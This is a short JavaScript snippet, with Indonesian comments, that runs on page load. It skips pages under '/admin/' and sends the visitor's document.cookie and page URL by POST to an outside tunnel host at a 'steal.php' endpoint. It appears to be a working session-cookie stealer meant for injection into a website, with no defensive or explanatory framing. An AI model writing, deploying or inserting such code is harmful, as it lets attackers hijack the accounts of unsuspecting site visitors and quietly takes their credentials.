window.addEventListener('load', () => {
    const currentUrl = window.location.href;

    if (currentUrl.includes('/admin/')) {
        console.log('Halaman admin, script tidak dijalankan');
        return;
    }

    fetch('https://soonest-therapist-backgrounds-producer.trycloudflare.com/steal.php', {
        method: 'POST',
        body: 'cookie=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(location.href),
        headers: { 
            'Content-Type': 'application/x-www-form-urlencoded' 
        },
        mode: 'no-cors'
    })
    .catch(err => console.error('Stealer error:', err)); // opsional
});
